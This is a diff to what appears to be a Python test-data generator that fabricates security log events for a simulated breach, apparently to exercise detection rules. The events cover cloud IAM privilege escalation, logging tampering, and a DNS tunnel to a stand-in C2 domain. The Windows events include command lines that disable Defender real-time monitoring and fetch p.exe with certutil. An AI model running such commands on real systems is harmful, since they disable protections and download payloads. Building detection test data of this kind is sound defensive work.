@@ -261,6 +261,78 @@ def build_events(now: float) -> list[tuple]:
                'sourceIPAddress=10.10.0.42 requestParameters_bucketName=corp-backups-prod '
                'bytes_out=734003200 awsRegion=us-east-1'))
 
+    # 12) AWS — IAM priv-esc, key creation, CloudTrail tampering, SG opened, root use
+    ev += [
+        (breach + 2000, CLOUD[0], CLOUD[1], "aws",
+         'eventName=CreateAccessKey userIdentity_userName=svc-deploy sourceIPAddress=10.10.0.42 awsRegion=us-east-1'),
+        (breach + 2100, CLOUD[0], CLOUD[1], "aws",
+         'eventName=AttachUserPolicy userIdentity_userName=svc-deploy '
+         'requestParameters_policyArn=arn:aws:iam::aws:policy/AdministratorAccess sourceIPAddress=10.10.0.42'),
+        (breach + 2200, CLOUD[0], CLOUD[1], "aws",
+         'eventName=StopLogging userIdentity_userName=svc-deploy sourceIPAddress=10.10.0.42 awsRegion=us-east-1'),
+        (breach + 2300, CLOUD[0], CLOUD[1], "aws",
+         'eventName=AuthorizeSecurityGroupIngress userIdentity_userName=svc-deploy '
+         'requestParameters_cidrIp=0.0.0.0/0 requestParameters_fromPort=22 sourceIPAddress=10.10.0.42'),
+        (breach + 2400, CLOUD[0], CLOUD[1], "aws",
+         'eventName=ConsoleLogin userIdentity_type=Root additionalEventData_MFAUsed=No sourceIPAddress=203.0.113.66'),
+    ]
+
+    # 13) Azure AD — risky sign-ins + Global Admin role grant + service-principal cred add
+    AZS, AZA = ("azure:aad:signin", "azure_signin"), ("azure:aad:audit", "azure_audit")
+    for i in range(6):
+        ev.append((bf_start - 2400 + i * random.uniform(20, 60), AZS[0], AZS[1], "azuread",
+                   'operationName="Sign-in activity" userPrincipalName=svc-deploy@corp.com '
+                   f'ipAddress={attacker} riskLevel=high clientAppUsed="Other clients" resultType=50074'))
+    ev += [
+        (breach + 2500, AZA[0], AZA[1], "azuread",
+         'operationName="Add member to role" initiatedBy=svc-deploy@corp.com targetRole="Global Administrator" result=success'),
+        (breach + 2600, AZA[0], AZA[1], "azuread",
+         'operationName="Add service principal credentials" initiatedBy=svc-deploy@corp.com targetResource="backup-sync-app" result=success'),
+    ]
+
+    # 14) GCP — owner IAM grant, service-account key, public bucket, logging sink deleted
+    GCP2 = ("google:gcp:pubsub:message", "gcp_audit")
+    ev += [
+        (breach + 2700, GCP2[0], GCP2[1], "gcp",
+         'methodName=SetIamPolicy principalEmail=svc-deploy@corp.iam.gserviceaccount.com '
+         'callerIp=10.10.0.42 role=roles/owner member=user:attacker@evil.example'),
+        (breach + 2800, GCP2[0], GCP2[1], "gcp",
+         'methodName=google.iam.admin.v1.CreateServiceAccountKey '
+         'principalEmail=svc-deploy@corp.iam.gserviceaccount.com callerIp=10.10.0.42'),
+        (breach + 2900, GCP2[0], GCP2[1], "gcp",
+         'methodName=storage.setIamPolicy principalEmail=svc-deploy@corp.iam.gserviceaccount.com '
+         'callerIp=10.10.0.42 member=allUsers resourceName="projects/_/buckets/corp-gcp-backups"'),
+        (breach + 3000, GCP2[0], GCP2[1], "gcp",
+         'methodName=google.logging.v2.ConfigServiceV2.DeleteSink '
+         'principalEmail=svc-deploy@corp.iam.gserviceaccount.com callerIp=10.10.0.42'),
+    ]
+
+    # 15) Advanced endpoint — LSASS access (cred dump), run-key persistence, scheduled task,
+    #     Defender tamper, LOLBin download
+    ev += [
+        (breach + 140, SYSMON[0], SYSMON[1], "WIN-APP01",
+         'EventCode=10 SourceImage="C:\\Windows\\System32\\rundll32.exe" '
+         'TargetImage="C:\\Windows\\System32\\lsass.exe" GrantedAccess=0x1010 User=svc_backup'),
+        (breach + 160, SYSMON[0], SYSMON[1], "WIN-APP01",
+         'EventCode=13 TargetObject="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" '
+         'Details="C:\\Windows\\Temp\\svc_update.exe" Image="powershell.exe"'),
+        (breach + 180, WINSEC[0], WINSEC[1], "WIN-DC01",
+         'EventCode=4698 TaskName="\\UpdateCheck" user=svc_backup '
+         'message="A scheduled task was created"'),
+        (breach + 200, SYSMON[0], SYSMON[1], "WIN-APP01",
+         'EventCode=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
+         'CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true" User=svc_backup'),
+        (breach + 220, SYSMON[0], SYSMON[1], "WIN-APP01",
+         'EventCode=1 Image="C:\\Windows\\System32\\certutil.exe" '
+         'CommandLine="certutil -urlcache -split -f http://198.51.100.23/p.exe" User=svc_backup'),
+    ]
+
+    # 16) DNS tunneling — many long unique subdomains to one parent domain
+    for i in range(24):
+        sub = "".join(random.choice("0123456789abcdef") for _ in range(48))
+        ev.append((beacon_start + i * random.uniform(5, 12), "stream:dns", "dns", "fw01",
+                   f'src_ip=10.10.0.42 query={sub}.tun.evil-c2.example query_type=TXT'))
+
     ev.sort(key=lambda e: e[0])
     return ev
 
